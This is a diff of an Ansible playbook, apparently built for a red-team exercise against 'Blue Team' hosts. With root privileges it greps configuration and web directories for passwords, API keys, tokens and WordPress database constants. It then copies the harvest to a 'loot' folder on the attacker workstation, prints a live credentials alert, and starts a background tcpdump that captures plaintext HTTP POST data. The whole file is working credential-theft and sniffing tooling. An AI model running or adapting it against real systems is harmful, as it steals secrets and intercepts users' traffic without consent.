@@ -1,50 +1,50 @@
 ---
-# PHASE 1: Internal File Scrubbing (Run on Blue Team Boxes)
 - name: Targeted Secret Extraction
-  become: yes  # Critical for reading protected /etc and /var/www/html files
+  become: yes
   shell: |
-    # Matches common assignment patterns: pass=, password:, DB_PASSWORD, etc.
-    grep -rEho "(password|passwd|db_p[^\s=]+|api_key|token)[:=]\s*['\"][^'\"]+['\"]|[:=]\s*[a-zA-Z0-9!@#$%^&*]{8,20}" /etc /var/www /opt 2>/dev/null | sort -u
+    # Matches patterns like pass=val or password:val
+    # grep -vE removes the system library junk (unmount, update, etc.)
+    grep -rEho "(password|passwd|db_pass|api_key|token|secret)\s*[:=]\s*['\"]?[^'\" \t\n;]+['\"]?" /etc /var/www 2>/dev/null \
+    | grep -vE "(undefined|update|unmount|unit|url|use|validate|unconf|uncert|unselect|unserialize)" \
+    | sort -u
   register: config_secrets
   failed_when: false
   changed_when: false
 
-- name: Specific Web/DB Constant Extraction
+- name: Web and Database Constant Extraction
   become: yes
   shell: |
-    # Specifically targets PHP 'define' style strings often used in WordPress
-    grep -rEho "DB_(PASSWORD|USER|HOST|NAME)['\"],\s*['\"][^'\"]+['\"]" /var/www/html 2>/dev/null
+    # Targets PHP define statements and cleans the output: DB_PASS = value
+    grep -rEho "DB_(PASSWORD|USER|HOST|NAME)['\"],\s*['\"][^'\"]+['\"]" /var/www/html 2>/dev/null \
+    | sed "s/['\"],/ = /g" | tr -d "()',\""
   register: web_secrets
   failed_when: false
   changed_when: false
 
-# PHASE 2: Exfiltration (Deliver to Red Workstation)
 - name: Deliver Harvested Data to Local Loot
   delegate_to: localhost
   copy:
     content: |
       === HARVEST REPORT: {{ inventory_hostname }} ===
-      
-      [CONFIG FILE SECRETS]
-      {{ config_secrets.stdout if config_secrets.stdout != "" else "No matches found." }}
-
-      [WEB APP CONSTANTS]
-      {{ web_secrets.stdout if web_secrets.stdout != "" else "No matches found." }}
+      [CONFIG SECRETS]
+      {{ config_secrets.stdout if config_secrets.stdout != "" else "None" }}
+      [WEB CONSTANTS]
+      {{ web_secrets.stdout if web_secrets.stdout != "" else "None" }}
     dest: "{{ playbook_dir }}/loot/{{ inventory_hostname }}/harvest_results.txt"
   become: no
+  when: config_secrets.stdout != "" or web_secrets.stdout != ""
 
-# PHASE 3: The Live Feed (Instant Terminal Alert)
-- name: "LIVE CREDS ALERT: {{ inventory_hostname }}"
+- name: LIVE CREDS ALERT
   debug:
     msg: 
       - "Configs: {{ config_secrets.stdout_lines | default(['None']) }}"
       - "Web/DB: {{ web_secrets.stdout_lines | default(['None']) }}"
-  when: (config_secrets.stdout != "") or (web_secrets.stdout != "")
+  when: config_secrets.stdout != "" or web_secrets.stdout != ""
 
-# PHASE 4: Network Sniffing (Run ONCE in background)
 - name: Start Background Network Sniffer
   delegate_to: localhost
   shell: |
+    # Ensure ens8 matches the Red Workstation interface (check 'ip a')
     nohup tcpdump -i ens8 -A -nn -l 'tcp port 80 and (tcp[((tcp[12:1]) >> 2):4] = 0x504f5354)' > {{ playbook_dir }}/loot/network_sniff.log 2>&1 &
   run_once: true
   become: yes
